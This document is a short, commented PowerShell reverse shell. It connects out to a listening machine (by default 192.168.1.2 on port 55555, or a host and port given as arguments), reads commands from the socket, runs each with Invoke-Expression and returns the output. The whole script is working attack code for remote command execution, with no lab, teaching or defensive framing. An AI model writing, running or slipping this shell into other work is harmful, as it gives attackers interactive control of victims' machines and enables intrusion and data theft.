$clientIP = "192.168.1.2" # IP Address of the listening machine
$clientPort = 55555 # Port Number of the listening machine

if ($args.Length -eq 2) { # Set client IP and Port as command line arguments
    $clientIP = $args[0]
    $clientPort = $args[1]
}

$socket = New-Object System.Net.Sockets.TcpClient # Create a new TCP socket
$socket.Connect($clientIP, $clientPort) # Connect to the listening machine on the specified port

$stream = $socket.GetStream() # Create a stream object to send and receive data
$streamReader = New-Object System.IO.StreamReader($stream) # Read data from stream
$streamWriter = New-Object System.IO.StreamWriter($stream) # Write data to stream
$streamWriter.AutoFlush = $true # Send stream data immediately

while ($true) {
    $command = $streamReader.ReadLine() # Read command from stream

    if ($command -eq "exit") {
        break
    }

    try {
        # Execute the command and capture the output
        $output = Invoke-Expression -Command $command
        $outputString = $output | Out-String
        $streamWriter.WriteLine($outputString)
    } catch {
        $errorText = "Error: $($_.Exception.Message)"
        $streamWriter.WriteLine($errorText)
    }
}

$streamReader.Close() # Close stream reader
$streamWriter.Close() # Close stream writer
$stream.Close() # Close stream
$socket.Close() # Close socket
